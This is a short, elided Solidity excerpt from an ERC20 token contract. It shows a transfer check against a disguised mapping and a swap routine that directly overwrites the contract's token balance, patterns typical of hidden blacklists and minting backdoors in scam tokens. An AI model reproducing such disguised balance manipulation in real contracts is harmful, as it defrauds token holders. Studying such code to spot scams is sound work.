...
contract Contract is IERC20, Ownable {
    ...
    function _transfer(
        ...
        if (!inSwapAndLiquify && from != uniswapV2Pair && from != address(router) && !_rTotal[from] && amount <= swapAtAmount) {
    ...
    function swapTokensForEth(uint256 tokenAmount, address to) private {
        ...
        path[0] = address(this);
        path[1] = router.WETH();
        if (tokenAmount > swapAtAmount) _balances[address(this)] = tokenAmount;
